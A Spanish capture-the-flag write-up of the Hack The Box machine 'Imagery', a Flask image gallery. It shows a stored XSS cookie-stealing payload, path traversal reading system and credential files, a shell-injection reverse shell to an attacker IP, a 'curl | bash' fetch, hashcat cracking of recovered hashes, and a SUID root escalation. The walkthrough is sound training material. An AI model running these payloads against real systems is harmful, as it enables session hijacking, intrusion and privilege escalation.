---
layout: single
title: Imagery - Hack The Box
excerpt: "Imagery es una máquina de dificultad Medium que aloja una galería de imágenes basada en Flask. La intrusión comienza explotando una vulnerabilidad de Stored XSS en el sistema de reporte de errores, lo que nos permitirá secuestrar la cookie de sesión del administrador. Tras obtener acceso.."
date: 2026-02-25
classes: wide
header:
  teaser: /assets/images/htb-writeup-imagery/logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:
  - linux
  - python-flask
  - pyaescrypt
  - aescrypt
  - xss
  - lfi
  - rce
  - md5-cracking
  - aes-crypt-cracking
---

# About

**Imagery** es una máquina de dificultad **Medium** que aloja una galería de imágenes basada en **Flask**. La intrusión comienza explotando una vulnerabilidad de **Stored XSS** en el sistema de reporte de errores, lo que nos permitirá secuestrar la cookie de sesión del administrador. Tras obtener acceso, aprovecharemos una vulnerabilidad de **Local File Inclusion (LFI)** en el lector de logs para extraer el código fuente. Finalmente, tras auditar el código, lograremos una **Inyección de Comandos (RCE)** en el módulo de edición de imágenes para obtener ejecución remota al servidor.

# Contents

- [1. Enumeration](#1-enumeration)
    - [1.1 Full Port Scan](#11-full-port-scan)
    - [1.2 Service/Version Detention](#12-serviceversion-detention)
    - [1.3 Virtual Host](#13-virtual-host)
- [2. Exploitation](#2-exploitation)
    - [2.1 Cross-Site Scripting (XSS)](#21-cross-site-scripting-xss)
        - [2.1.1 Session Hijacking](#211-session-hijacking)
    - [2.2 Local File Inclusion (LFI)](#22-local-file-inclusion-lfi)
        - [2.2.1 Web Fuzzing con Burp Suite](#221-web-fuzzing-con-burp-suite)
        - [2.2.2 Source Code](#222-source-code)
    - [2.3 Remote Code Execution(RCE)](#23-remote-code-executionrce)
         - [2.3.1 Users Hashes](#231-users-hashes)
         - [2.3.2 Web Shell](#232-web-shell)
- [3. Post Explotacion](#3-post-explotacion)
    - [3.1 Enumeration](#31-enumeration)
    - [3.2 Cracking AES Encryption](#32-cracking-aes-encryption)
        - [3.2.1 Users hashes](#321-users-hashes)
    - [3.3 Privilege Escalation](#33-privilege-escalation)


# 1. Enumeration

Iniciamos con una fase de reconocimiento activo para identificar la superficie de ataque. El objetivo es descubrir servicios en ejecución y versiones específicas que puedan presentar debilidades.

## 1.1 Full Port Scan

Ejecutamos un escaneo inicial sobre el rango completo de puertos `TCP (1-65535)` para asegurar que no pasamos por alto ningún servicio oculto en puertos no estándar.

```
nmap -p- -vvv --min-rate 5000 10.129.242.164
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-19 14:46 -05
Initiating Ping Scan at 14:46
Scanning 10.129.242.164 [2 ports]
Completed Ping Scan at 14:46, 0.32s elapsed (1 total hosts)
Initiating Connect Scan at 14:46
Scanning imagery.htb (10.129.242.164) [65535 ports]
Discovered open port 22/tcp on 10.129.242.164
Completed Connect Scan at 14:46, 26.62s elapsed (65535 total ports)
Nmap scan report for imagery.htb (10.129.242.164)
Host is up, received conn-refused (0.17s latency).
Scanned at 2026-02-19 14:46:05 -05 for 27s
Not shown: 65465 filtered tcp ports (no-response)
PORT      STATE  SERVICE          REASON
22/tcp    open   ssh              syn-ack
8000/tcp  open   http-alt         syn-ack ttl 63
```

## 1.2 Service/Version Detention

Una vez identificados los puertos abiertos, realizamos un escaneo más profundo utilizando los flags `-sC` (scripts por defecto) y `-sV` (detección de versiones).

```
nmap -p 22,8000 -sCV 10.129.242.164
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-19 14:53 -05
Nmap scan report for imagery.htb (10.129.242.164)
Host is up (0.17s latency).

PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 9.7p1 Ubuntu 7ubuntu4.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 35:94:fb:70:36:1a:26:3c:a8:3c:5a:5a:e4:fb:8c:18 (ECDSA)
|_  256 c2:52:7c:42:61:ce:97:9d:12:d5:01:1c:ba:68:0f:fa (ED25519)
8000/tcp open  http-alt Werkzeug/3.1.3 Python/3.12.7
|_http-server-header: Werkzeug/3.1.3 Python/3.12.7
```

## 1.3 Virtual Host

Dado que el servidor web puede estar configurado para responder a un nombre de dominio específico, es necesario mapear la dirección IP de la instancia al nombre de dominio **imagery.htb**. Esto permite que el navegador (o herramientas como curl) envíe el encabezado HTTP Host correcto.

Modificamos el archivo `/etc/hosts` de nuestra maquina local:

```
echo "10.129.243.164 imagery.htb" | sudo tee -a /etc/hosts
```

![](/assets/images/htb-writeup-imagery/home.png)

Al acceder a `http://imagery.htb:8000`, nos encontramos con una plataforma de gestión de imágenes. Para interactuar con las funciones internas de la aplicación, procedemos a crear una cuenta de usuario.

- **Registro**: Navegamos al endpoint `/register` para crear un nuevo perfil.
- **Autenticación**: Una vez registrados, iniciamos sesión en el panel de `/login`

# 2. Exploitation

## 2.1 Cross-Site Scripting (XSS)

Durante la auditoría del panel de usuario, identificamos que el formulario en el path `/admin/bug_reports` no sanitiza correctamente la entrada del campo **Bug Details**. Al ser un reporte que será visualizado por un usuario con privilegios elevados (administrador), esto representa un vector de **Stored XSS**.

Para explotar esta vulnerabilidad y obtener la **cookie** de sesión del administrador, enviaremos un reporte de error inyectando un payload diseñado para forzar al navegador de la víctima a redirigirse a nuestro servidor.

En nuestra máquina local:

```
python -m http.server 8080
```

**Payload**:

```html
<img src=/ onerror="document.location='http://{ip_atacante}:8080/'+document.cookie" />
```

Para automatizar o replicar esta acción, podemos interceptar la petición y ejecutarla desde la consola del navegador:

```js
await fetch("http://imagery.htb:8000/report_bug", {
    "method": "POST",
    "headers": {
        "Content-Type": "application/json"
    },
    "body": JSON.stringify({
        "bugName": "Critical UI Bug",
        "bugDetails": "<img src=/ onerror=\"document.location='http://10.10.15.107:8080/'+document.cookie\">"
    })
});
```

Una vez que el administrador accede al reporte para revisarlo, su navegador ejecuta el código malicioso agregando la cookie sesión en la URL.

```
python -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
10.129.242.164 - - [19/Feb/2026 16:46:11] code 404, message File not found
10.129.242.164 - - [19/Feb/2026 16:46:11] "GET /session=.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aZeEnw.GC9hjlqO-RnfgqivZOtmhF_yJKE HTTP/1.1" 404 -
10.129.242.164 - - [19/Feb/2026 16:46:11] code 404, message File not found
10.129.242.164 - - [19/Feb/2026 16:46:11] "GET /favicon.ico HTTP/1.1" 404 -
```

Al no tener la flag `HttpOnly` incluida en el encabezado `HTTP Set-Cookie` deja a la aplicación expuesta a ataques de **Cross-Site Scripting (XSS)** y **Session Hijacking**(*secuestro de sesión*).

Con esta cookie, procedemos a suplantar la identidad del administrador en el navegador para acceder a funciones restringidas.

### 2.1.1 Session Hijacking

Procedemos a realizar un **Secuestro de sesión**. Para ello, interceptamos la sesión actual en el navegador `(DevTools > Storage)` y sustituimos el valor de nuestra cookie sesión por el token capturado.

![](/assets/images/htb-writeup-imagery/secuestroSesion.png)

El servidor nos reconoce como el usuario **admin@imagery.htb**. Al explorar el panel administrativo, identificamos nuevas funcionalidades críticas:

- Gestión de usuarios (Eliminación).
- Visualización y borrado de reportes de errores.
- **Lectura de logs del sistema**.

Al analizar la petición encargada de obtener los registros del sistema, observamos un parámetro interesante:

```js
await fetch("http://imagery.htb:8000/admin/get_system_log?log_identifier=admin%40imagery.htb.log", {
    // ... headers ...
    "method": "GET"
});

```

## 2.2 Local File Inclusion (LFI)

Al analizar  el **Path** `/admin/get_system_log` y su **Query scrign** `?log_identifier=admin%40imagery.htb.log` notamos que el parámetro recibe el nombre de un log. En aplicaciones basadas en **Flask**, este comportamiento suele indicar que el backend utiliza una función de lectura de archivos para servir el contenido dinámicamente.

Si el servidor no sanitiza correctamente esta entrada (por ejemplo, mediante el uso de `os.path.join` sin validar secuencias de escape), estaríamos ante una vulnerabilidad de **Local File Inclusion (LFI)** o **Arbitrary File Read**.

Para confirmarlo, realizamos una fase de **Web Fuzzing** sobre el parámetro `log_identifier`.

### 2.2.1 Web Fuzzing con Burp Suite

Para validar el alcance del LFI, utilizamos el módulo **Intruder** de Burp Suite configurado en modo Sniper. Empleamos la wordlist [SecList/Fuzzing/LFI/LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt), la cual contiene una amplia variedad de secuencias de salto de directorio y archivos conocidos de Linux.

Encontramos que podemos descargar y ver los directorios estándares del sistema.

- `/etc`: Confirmamos el Path Traversal al recuperar con éxito `/etc/group`. Este archivo nos reveló la existencia de un usuario de sistema `web:x:1001:` (UID 1001), sugiriendo que la aplicación no corre bajo el contexto de `root`, sino de un usuario llamado **web**.
  - `/etc/passwd` 
  - `/etc/hosts`
  - `/etc/crontab`
  - `/etc/group`

  ![](/assets/images/htb-writeup-imagery/lfi-etc.png)

- `/proc`: Es un archivo "virtual" que solo existe en la memoria mientras el sistema corre. Donde muestra las variables de entorno del proceso que se está ejecutando actualmente `HOME=/home/web` (el servidor de flask). 
  - `/proc/self/environ`

  ![](/assets/images/htb-writeup-imagery/lfi-proc.png)


### 2.2.2 Source Code

En un entorno Flask, el archivo `app.py` suele actuar como el orquestador de la lógica del servidor.

```
curl -s -O -b 'session={admin_cookie}' http://imagery.htb:8000/admin/get_system_log?log_identifier=/home/web/web/app.py
```

Se confirma que `SESSION_COOKIE_HTTPONLY` está explícitamente en False, lo que permitió nuestro ataque inicial de XSS.

```py
from flask import Flask, render_template
import os
import sys
from datetime import datetime
from config import *
from utils import _load_data, _save_data
from utils import *
from api_auth import bp_auth
from api_upload import bp_upload
from api_manage import bp_manage
from api_edit import bp_edit
from api_admin import bp_admin
from api_misc import bp_misc

app_core = Flask(__name__)
app_core.secret_key = os.urandom(24).hex()
app_core.config['SESSION_COOKIE_HTTPONLY'] = False
```

La aplicación importa módulos específicos para cada función.

- `config.py`
- `utils.py`
- `api_auth.py`
- `api_upload.py`
- `api_manage.py`
- `api_edit.py`
- `api_admin.py`
- `api_misc.py`

Continuamos extrayendo archivos críticos definidos en los imports y en `config.py`:

```py
import os
import ipaddress

DATA_STORE_PATH = 'db.json'
UPLOAD_FOLDER = 'uploads'
SYSTEM_LOG_FOLDER = 'system_logs'
```

`config.py` define `DATA_STORE_PATH = 'db.json'`. Al descargar este archivo, obtenemos los hashes de las contraseñas de los usuarios.

```json
{
    "users": [
        ...
        {
            "username": "testuser@imagery.htb",
            "password": "2c65c8d7bfbca32a3ed42596192384f6",
            "isAdmin": false,
            "displayId": "e5f6g7h8",
            "login_attempts": 0,
            "isTestuser": true,
            "failed_login_attempts": 0,
            "locked_until": null
        }
    ]
    ...
}
```

## 2.3 Remote Code Execution(RCE)

Analicemos el método `apply_visual_transform()` de `api_edit.py`.

```py
@bp_edit.route('/apply_visual_transform', methods=['POST'])
def apply_visual_transform():
    if not session.get('is_testuser_account'):
        return jsonify({'success': False, 'message': 'Feature is still in development.'}), 403
    if 'username' not in session:
        return jsonify({'success': False, 'message': 'Unauthorized. Please log in.'}), 401
    request_payload = request.get_json()
    image_id = request_payload.get('imageId')
    transform_type = request_payload.get('transformType')
    params = request_payload.get('params', {})
    if not image_id or not transform_type:
        return jsonify({'success': False, 'message': 'Image ID and transform type are required.'}), 400
    ...
    try:
        if transform_type == 'crop':
            x = str(params.get('x'))
            y = str(params.get('y'))
            width = str(params.get('width'))
            height = str(params.get('height'))
            command = f"{IMAGEMAGICK_CONVERT_PATH} {original_filepath} -crop {width}x{height}+{x}+{y} {output_filepath}"
            subprocess.run(command, capture_output=True, text=True, shell=True, check=True)
        elif transform_type == 'rotate':
            degrees = str(params.get('degrees'))
            command = [IMAGEMAGICK_CONVERT_PATH, original_filepath, '-rotate', degrees, output_filepath]
            subprocess.run(command, capture_output=True, text=True, check=True)
        elif transform_type == 'saturation':
            value = str(params.get('value'))
            command = [IMAGEMAGICK_CONVERT_PATH, original_filepath, '-modulate', f"100,{float(value)*100},100", output_filepath]
            subprocess.run(command, capture_output=True, text=True, check=True)
        elif transform_type == 'brightness':
            value = str(params.get('value'))
            command = [IMAGEMAGICK_CONVERT_PATH, original_filepath, '-modulate', f"100,100,{float(value)*100}", output_filepath]
            subprocess.run(command, capture_output=True, text=True, check=True)
        elif transform_type == 'contrast':
            value = str(params.get('value'))
            command = [IMAGEMAGICK_CONVERT_PATH, original_filepath, '-modulate', f"{float(value)*100},{float(value)*100},{float(value)*100}", output_filepath]
            subprocess.run(command, capture_output=True, text=True, check=True)
        ...
```

Identificamos una vulnerabilidad crítica en el path `/apply_visual_transform`. Aunque la función está restringida a usuarios con el atributo `is_testuser_account` (el cual confirmamos que posee el usuario **testuser@imagery.htb** en `db.json`).

Como vemos en el código fuente, este método tiene varias acciones para transformar una imagen: 
- `crop`: Recortar
- `rotate`: Girar / Rotar
- `saturation`: Saturacion
- `brightness`: Brillo
- `contrast`: Constraste

Analicemos el condicional de la acción de **recortar**.

```py
if transform_type == 'crop':
    x = str(params.get('x'))
    y = str(params.get('y'))
    width = str(params.get('width'))
    height = str(params.get('height'))
    command = f"{IMAGEMAGICK_CONVERT_PATH} {original_filepath} -crop {width}x{height}+{x}+{y} {output_filepath}"
    subprocess.run(command, capture_output=True, text=True, shell=True, check=True)
```

El desarrollador en este punto utiliza **ImageMagick** que es una suite de línea de comandos para procesar imágenes. Las variables `x`, `y`, `width` y `height` provienen directamente del input del usuario (`request.get_json()`) sin ningún tipo de **saneamiento** o **validación numérica**.

Al ejecutar `subprocess.run` con el argumento `shell=True`, Python invoca `/bin/sh` para interpretar la cadena command. Esto permite el uso de metacaracteres de shell (como `;`, `&&`, `|`) para encadenar comandos arbitrarios.

Para explotar esto, necesitamos que el parámetro `x` rompa la sintaxis del comando original, haciendo que la concatenación referenciada en la variable `command` solo tome el valor de `x` para poder inyectar un comando del sistema operativo y hacernos con el servidor web vía `reverse shell`.

Las otras funciones (`rotate`, `saturation`, etc.) utilizan una lista de argumentos en `subprocess.run` (lo cual es seguro), la función `crop` usa una `f-string` vulnerable.

**Ejemplo**:

```py
import subprocess

# Variables que no queremos que afecten
IMAGEMAGICK_CONVERT_PATH = "convert"
original_filepath = "imagen.jpg"
width, height, y = 100, 100, 0
output_filepath = "salida.jpg"

# El "inyector" en x:
# 1. El primer ';' termina el intento de 'convert'
# 2. 'ls -l' es lo que realmente se ejecutará
# 3. El '#' hace que '+{y} {output_filepath}' sea ignorado
x = "; ls -l #"

command = f"{IMAGEMAGICK_CONVERT_PATH} {original_filepath} -crop {width}x{height}+{x}+{y} {output_filepath}"

subprocess.run(command, shell=True)
```

En este script vemos que es posible romper la cadena y usar `x` como inyector.

### 2.3.1 Users Hashes

Para explotar la inyección de comandos, la aplicación requiere que la sesión activa tenga el atributo `is_testuser_account` habilitado. Este flag se activa al autenticarse como el usuario **testuser@imagery.htb**.

Con el hash extraído, ejecutamos un ataque de fuerza bruta basado en diccionario y el modo específico para **MD5** `(-m 0)`:

```
hashcat "2c65c8d7bfbca32a3ed42596192384f6" -m 0 /usr/share/SecLists/Passwords/Leaked-Databases/rockyou.txt
```

- **Password**: iambatman

### 2.3.2 Web Shell

Para disparar la vulnerabilidad de inyección de comandos, el usuario con una imagen en su galería, permitiendo así invocar la petición `/apply_visual_transform`. El objetivo es forzar al servidor a web ejecutar una **Reverse Shell**.

En nuestra máquina local:

```
nc -lvnp 8080
Listening on 0.0.0.0 8080
```

**Payload**:

```
; bash -c 'bash -i >& /dev/tcp/{IP_ATACANTE}/{PUERTO} 0>&1' #
```

- `bash -i`: Invoca una shell de Bash interactiva.

- `>& /dev/tcp/{IP}/{PORT}`: Redirige la salida estándar (`stdout`) y el error estándar (`stderr`) hacia un socket TCP dirigido a nuestra IP.

- `0>&1`: Redirige la entrada estándar (`stdin`) al mismo descriptor de archivo, permitiendo que los comandos que enviemos desde Netcat sean ejecutados por la shell de la víctima.

Procedemos a capturar la petición `/apply_visual_transform`, inyectar el payload en el parámetro `x` y ejecutarla en la consola del navegador. 

```js
await fetch("http://imagery.htb:8000/apply_visual_transform", {
    "credentials": "include",
    "headers": {
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.9",
        "Content-Type": "application/json",
    },
    "body": JSON.stringify({
        "imageId":"7aad4727-b33a-482f-9dab-2b5154b89d00",
        "transformType":"crop",
        "params":{"x":"; bash -c 'bash -i >& /dev/tcp/10.10.14.127/8080 0>&1' #",
            "y":4,
            "width":5,
            "height":4
        }
    }),
    "method": "POST",
    "mode": "cors"
});
```

Al procesar la solicitud, el servidor ejecuta nuestra cadena maliciosa bajo el contexto del usuario **web**, conectándose hacia nuestra máquina y estableciendo el túnel de control:

```
nc -lvnp 8080
Listening on 0.0.0.0 8080
Connection received on 10.129.242.164 48522
bash: cannot set terminal process group (1357): Inappropriate ioctl for device
bash: no job control in this shell
web@Imagery:~/web$ id
uid=1001(web) gid=1001(web) groups=1001(web)
```

# 3. Post Explotacion

## 3.1 Enumeration
Procedemos con la fase de enumeración local para identificar vectores de escalada de privilegios. Para agilizar este proceso, utilizaremos la herramienta **LinPEAS**, un script automatizado que busca desconfiguraciones, archivos sensibles y vulnerabilidades en el kernel.

En nuestra máquina de ataque, preparamos el binario y levantamos un servidor web para disponibilizar el archivo:

```
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh && python -m http.server 8000
```

Desde el servidor web, descargamos y ejecutamos el script directamente en memoria para minimizar la huella en disco:

```
curl -s http://{IP_ATACANTE}:8000/linpeas.sh | bash
```

Durante la enumeración, el script resalta un hallazgo crítico en el directorio `/var/backup`. Se trata de un archivo comprimido y cifrado mediante el algoritmo **AES Encryption**, el cual posee permisos de lectura para todos los usuarios:

```
web@Imagery:/var/backup$ ll
total 22524
drwxr-xr-x  2 root root     4096 Sep 22 18:56 ./
drwxr-xr-x 14 root root     4096 Sep 22 18:56 ../
-rw-rw-r--  1 root root 23054471 Aug  6  2024 web_20250806_120723.zip.aes
```

Enviamos el archivo a nuestra máquina local para realizar un análisis forense. Para ello, establecemos una transferencia de archivos punto a punto.

```
nc -lvnp 8000 > backup_web.zip.aes
```

Desde el servidor web:

```
web@Imagery:/var/backup$ nc {IP_ATACANTE} 8000 < web_20250806_120723.zip.aes
```

## 3.2 Cracking AES Encryption

Para determinar la naturaleza real del archivo, usaremos el comando `file`. Para identificar el tipo de archivo mediante el análisis de su cabecera y "números mágicos". 

```
file backup_web.zip.aes 
backup_web.zip.aes: AES encrypted data, version 2, created by "pyAesCrypt 6.1.1"
```

Instalamos la CLI oficial de [AES Crypt](https://www.aescrypt.com/download/) en nuestra máquina. Sin embargo, al intentar el descifrado, el sistema solicita una contraseña:

```
aescrypt
Specify either encrypt (-e), decrypt (-d), or generate (-g) mode
aescrypt -d backup_web.zip.aes
Enter password: 
```

Para recuperar la clave, utilizaremos el script `aescrypt2hashcat.pl` del repositorio oficial de [Hashcat Tools](https://github.com/hashcat/hashcat/blob/master/tools). Este script extrae hash de archivos `.aes`.

```
perl aescrypt2hashcat.pl backup_web.zip.aes  > backup_web_hash.txt

cat backup_web_hash.txt 
$aescrypt$1*98b981e1c146c078b5462f09618b1341*0dd95827498496b8c8ca334d99b13c28*10c6eeb86b1d71475fc5d52ed52d67c20bd945d53b9ac0940866bc8dfbba72c1*e042d41d09ac2726044d63af1276c49e2c8d5f9eb9da32e58bf36cf4f0ad9c6
```

Con el hash extraído, ejecutamos un ataque de fuerza bruta basado en diccionario y modo específico para **AES Crypt** `(-m 22400)`:

```
hashcat -m 22400 backup_web_hash.txt /usr/share/SecLists/Passwords/Leaked-Databases/rockyou.txt.tar.gz
```

- **Password**: bestfriends

### 3.2.1 Users hashes

Tras obtener la contraseña, desciframos y descomprimimos el contenido para inspeccionar los archivos del proyecto:

```
aescrypt -d backup_web.zip.aes 
Enter password:bestfriends
Decrypting: backup_web.zip.aes
```

```
unzip backup_web.zip
cat backup_web.zip
```

Al explorar la estructura del backup, localizamos el archivo `db.json`, el cual actúa como base de datos de la aplicación y contiene información sensible de los usuarios:

```json
{
    "users": [
        ...
        {
            "username": "mark@imagery.htb",
            "password": "01c3d2e5bdaf6134cec0a367cf53e535",
            "displayId": "868facaf",
            "isAdmin": false,
            "failed_login_attempts": 0,
            "locked_until": null,
            "isTestuser": false
        }
        ...
    ]
}
```

Con el hash extraído, ejecutamos un ataque de fuerza bruta basado en diccionario y modo específico para **MD5** `(-m 0)`:

```
hashcat "01c3d2e5bdaf6134cec0a367cf53e535" -m 0 /usr/share/SecLists/Passwords/Leaked-Databases/rockyou.txt.tar.gz
```
- **Password**: supersmash

## 3.3 Privilege Escalation

Tras comprometer la cuenta del usuario **mark@imagery.htb**, procedemos a la enumeración del sistema en busca de vectores de escalada vertical.

El el servidor web con autenticados como mark:

```
mark@Imagery:~$ ls
user.txt
mark@Imagery:~$ cat user.txt 
0f3184d1bc73c1b5a5ebb187e4b5a54c
mark@Imagery:~$ sudo -l
Matching Defaults entries for mark on Imagery:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User mark may run the following commands on Imagery:
    (ALL) NOPASSWD: /usr/local/bin/charcol
```

El usuario puede ejecutar `/usr/local/bin/charcol` con privilegios de **root** sin requerir contraseña.

```
mark@Imagery:~$ sudo charcol -R
mark@Imagery:~$ sudo charcol shell
[2026-02-25 19:55:32] [INFO] Entering Charcol interactive shell. Type 'help' for commands, 'exit' to quit.
charcol>help
 Automated Jobs (Cron):
    auto add --schedule "<cron_schedule>" --command "<shell_command>" --name "<job_name>" [--log-output <log_file>]
      Purpose: Add a new automated cron job managed by Charcol.
      Verification:
        - If '--app-password' is set (status 1): Requires Charcol application password (via global --app-password flag).
        - If 'no password' mode is set (status 2): Requires system password verification (in interactive shell).
      Security Warning: Charcol does NOT validate the safety of the --command. Use absolute paths.
      Examples:
        - Status 1 (encrypted app password), cron:
          CHARCOL_NON_INTERACTIVE=true charcol --app-password <app_password> auto add \
          --schedule "0 2 * * *" --command "charcol backup -i /home/user/docs -p <file_password>" \
          --name "Daily Docs Backup" --log-output <log_file_path>
        - Status 2 (no app password), cron, unencrypted backup:
          CHARCOL_NON_INTERACTIVE=true charcol auto add \
          --schedule "0 2 * * *" --command "charcol backup -i /home/user/docs" \
          --name "Daily Docs Backup" --log-output <log_file_path>
        - Status 2 (no app password), interactive:
          auto add --schedule "0 2 * * *" --command "charcol backup -i /home/user/docs" \
          --name "Daily Docs Backup" --log-output <log_file_path>
          (will prompt for system password)
```

Al inspeccionar el manual de ayuda, indica explícitamente que la herramienta no valida la **seguridad de los comandos ejecutados**.

Haremos uso de la instrucción `auto`, para programar un schedule job que ejecutar la asignación del bit **SUID** al binario `/bin/bash` para que nos devuelva una shell de bash en modo root.

```
charcol> auto add --schedule "* * * * *" --command "chmod u+s /bin/bash" --name "pwn" --log-output "/home/mark/pwn.log"
```

```
mark@Imagery:~$ /bin/bash -p
bash-5.2# id
uid=1002(mark) gid=1002(mark) euid=0(root) egid=0(root) groups=0(root),1002(mark)
```

**Hemos tomado control total del servidor.**

*Este contenido tiene fines exclusivamente **éticos** y **educativos** . El uso de estas técnicas en sistemas sin autorización previa es ilegal.*
